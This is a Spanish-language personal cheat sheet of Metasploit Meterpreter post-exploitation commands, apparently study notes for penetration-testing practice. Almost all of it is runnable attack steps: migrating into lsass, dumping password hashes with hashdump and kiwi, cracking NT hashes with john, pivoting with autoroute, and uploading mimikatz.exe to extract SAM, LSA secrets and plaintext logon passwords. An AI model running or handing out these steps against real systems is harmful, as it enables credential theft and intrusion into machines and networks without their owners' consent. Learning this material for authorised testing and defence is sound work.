# Meterpreter

Propietario: Adrian Gisbert Cabello

- Comandos para usar en metasploit una vez ubtenida una sesión meterpreter LINUX:
    - Para ver una ayuda de los comandos disponibles (esto cambiará si es una máquina windows o linux): `help`
    - Para ver información del sistema: `sysinfo`
    - Para subir un archivo: `upload archivo.txt`
    - Para el tratamiento de la TTY: `shell` → `/bin/bash -i`
    - Para guardar una sesión en background: `background`
    - Para saber los privilegios que tengo en una máquina: `getuid`
    - Buscar un proceso: `pgrep <nombre del proceso>` → `pgrep lsass`
    - Migrar un proceso: `migrate <número del proceso al que queremos migrar>` → `migrate 464`
    - Obtener el hash de las contraseñas de cada usuario: `hashdump`
    - Para crackear el hash lo guardamos en un archivo ***hash.txt*** (por ejemplo), y mediante la herramienta ***john*** ponemos el siguiente comando: `john --format=NT hash.txt wordlist=/usr/share/wordlists/rockyou.txt`	(el formato, hay que poner el que tenga el hash)
    - Para listar usuarios: `net users`
    - Para buscar un archivo: `search -f archivo.doc` (sustituimos archivo.doc por el nombre que necesitemos encontrar)
    - Para añadir una ip a la tabla de rutas de nuestra máquina atacante y poder ver otros equipos en esas subredes: `run autoroute -s 192.168.X.0/24` (aquí pondremos la nueva ip encontrada y su máscara de red, en este caso es /24 porque era 255.255.255.0
- En windows:
    - Para saber los privilegios que tengo en una máquina: `getuid`
    - Para listar usuarios: `net users` (este comando en una máquina windows funcionará si previamente hemos puesto el comando `shell`)
    - Podemos usar para ver los privilegios que tenemos: `getprivs`
    - Para ver los privilegios del usuario que tenemos: `shell` → `whoami /priv`
    - Ver los usuarios logeados: `query user`
    - Ver más información a cerca de un usuario: `net user <usuario>` → `net user administrator`
    - Ver más información de los grupos: `net localgroup` o `net localgroup <usuario>` → `net localgroup administrator`
    - Información del sistema: `systeminfo`
    - Para levear una sesión a meterpreter tenemos dos opciones:
        
        1. `sessions -u 1` (tenemos que cambiar el 1 por el número de la sesión que queramnos levear)
        
        2. `use shell_to_meterpreter`, ponemos el LHOST, LPORT y la SESSION. (una vez rellenados los datos le damos a `run` y se nos creará una nueva sesión meterpreter)
        
    - Para dumpear hashes de contraseñas podemos usar `kiwi`, en una sesión de meterpreter (antes tenemos que migrar el proceso lsass) escribimos: `load kiwi`:
    - El menú de ayuda: `?`
    - Para ver todas las credenciales: `creds_all`
    - Para ver todos los hashes de passwords: `lsa_dump_sam`
    - En algunos casos podemos ver los passwords en texto plano: `lsa_dump_secrets`
        
        También podemos usar `Mimikatz` por si son hashes difíciles:
        
        Hacemos un upload del archivo mimikatz.exe de nuestra máquina linux al equipo víctima (en este caso Win x64):
        
        `cd C:\\` (Nos vamos al directorio raíz)
        
        `mkdir Temp` (Creamos una carpeta temporal para poder trabajar)
        
        `cd Temp`
        
        `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` (Directorio donde se encuentra el archivo en nuestra máquina Kali)
        
        `shell` (Abrimos una consola de comandos)
        
        `.\mimikatz.exe`
        
        Una vez estamos dentro de Mimikatz:
        
        `lsadump::sam` (Nos da más información que `Kiwi`)
        
        `lsadump::secrets`
        
        `sekurlsa::logonpasswords` (Ver contraseñas en texto plano, si procede)